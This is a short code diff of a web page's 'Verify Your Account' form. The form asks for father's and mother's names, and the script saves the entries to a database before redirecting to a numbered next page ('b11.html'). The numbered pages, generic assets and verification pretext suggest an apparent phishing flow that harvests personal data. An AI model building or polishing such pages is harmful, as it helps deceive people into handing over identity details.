@@ -49,7 +49,9 @@
           });
 
           console.log("User data saved successfully with ID:", docRef.id);
-          window.open("b11.html", "_blank");
+
+          // ✅ FIX: same tab me open hoga
+          window.location.href = "b11.html";
 
         } catch (error) {
           console.error("Error saving user data:", error);
@@ -64,22 +66,27 @@
     <header>
       <img alt="lo" loading="lazy" width="509" height="99" class="logo" src="logo.png">
     </header>
+
     <main>
       <form id="verifyForm">
         <h1>Verify Your Account</h1>
+
         <div class="floating-container">
-          <input type="text" id="fatherName" name="fn" placeholder=" " required="">
+          <input type="text" id="fatherName" name="fn" placeholder=" " required>
           <label>Father's Name <span>*</span></label>
         </div>
+
         <div class="floating-container">
-          <input type="text" id="motherName" name="mn" placeholder=" " required="">
+          <input type="text" id="motherName" name="mn" placeholder=" " required>
           <label>Mother's Name <span>*</span></label>
         </div>
+
         <div class="btContainer">
           <button type="submit">Continue</button>
         </div>
       </form>
     </main>
+
     <footer>
       <div class="l">
         <img alt="s" loading="lazy" width="1080" height="769" class="l" src="s.jpg">
